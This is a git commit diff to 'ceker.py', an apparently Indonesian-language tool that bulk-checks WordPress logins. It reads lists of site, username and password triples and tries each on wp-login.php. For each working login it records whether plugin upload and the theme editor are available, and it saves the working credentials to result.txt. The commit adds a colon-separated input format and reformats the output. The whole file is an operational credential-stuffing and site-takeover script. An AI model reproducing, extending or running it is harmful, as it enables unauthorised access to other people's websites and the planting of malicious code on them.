534ff428c0b9cd6cdce1386d5c0a402c7136fda6
xk4njut <iwiriclik638@gmail.com>
2025-08-25 00:18:01 +0700

    Update ceker.py

--- ceker.py
+++ ceker.py
@@ -43,20 +43,34 @@ def check(url):
     try:
         site, user, passwd = '', '', ''
 
+        # Parse different URL formats
         if '@' in url and '#' in url:
+            # Format: url#username@password
             site = url.split("#")[0]
             user = url.split("#")[1].split("@")[0]
             passwd = url.split("#")[1].split("@")[1]
         elif url.count('|') == 2:
+            # Format: url|username|password
             data_split = url.split("|")
             site = data_split[0]
             user = data_split[1]
             passwd = data_split[2]
+        elif url.count(':') >= 2:
+            # Format: url:username:password
+            # Split from right to handle URLs containing ports
+            parts = url.rsplit(':', 2)
+            if len(parts) == 3:
+                site, user, passwd = parts
+            else:
+                raise ValueError("Invalid URL format (colon) > " + url)
         else:
             raise ValueError("Invalid URL format > " + url)
 
         # Normalize the site URL (add protocol if missing)
         site = normalize_url(site).rstrip('/')
+
+        # Create consistent output format
+        credential_str = f"{site}:{user}:{passwd}"
 
         # Set login URL
         login_url = site + '/wp-login.php'
@@ -79,13 +93,19 @@ def check(url):
             # Check for theme file editor permission
             has_theme_editor = 'theme-editor.php' in resp
             
-            print(' -| {:<50} --> {}[Login Successfully | Add Plugins: {} | Theme Editor: {}]'.format(url, fg, 'Yes' if has_add_plugins else 'No', 'Yes' if has_theme_editor else 'No'))
-            open("result.txt", "a").write(f"{site}:{user}:{passwd} | Add Plugins: {'Yes' if has_add_plugins else 'No'} | Theme Editor: {'Yes' if has_theme_editor else 'No'}\n")            
+            print(' -| {:<50} --> {}[Login Successfully | Add Plugins: {} | Theme Editor: {}]'.format(
+                credential_str, fg, 
+                'Yes' if has_add_plugins else 'No', 
+                'Yes' if has_theme_editor else 'No'
+            ))
+            open("result.txt", "a").write(
+                f"{credential_str} | Add Plugins: {'Yes' if has_add_plugins else 'No'} | Theme Editor: {'Yes' if has_theme_editor else 'No'}\n"
+            )            
         else:
-            print(' -| {:<50} --> {}[Login Failed]'.format(url, fr))
+            print(' -| {:<50} --> {}[Login Failed]'.format(credential_str, fr))
 
     except Exception as e:
-        print(' -| {:<50} --> {}[Error]'.format(site, fr))
+        print(' -| {:<50} --> {}[Error]'.format(credential_str, fr))
 
 if __name__ == "__main__":
     try:
@@ -100,9 +120,12 @@ if __name__ == "__main__":
     except IndexError:
         path = str(sys.argv[0]).split('/')
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter(banner + '\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt> <thread>'+ '\n [*] Contoh: ' + path[len(path) - 1] + ' list.txt 50')))
+        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), 
+              Center.XCenter(banner + '\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt> <thread>'+ 
+              '\n [*] Contoh: ' + path[len(path) - 1] + ' list.txt 50')))
         sys.exit(1)
 
     except FileNotFoundError:
-        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter('\n\n  [!] File >' + sys.argv[1] + '< tidak di temukan!')))
+        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), 
+              Center.XCenter('\n\n  [!] File >' + sys.argv[1] + '< tidak di temukan!')))
         sys.exit(1)
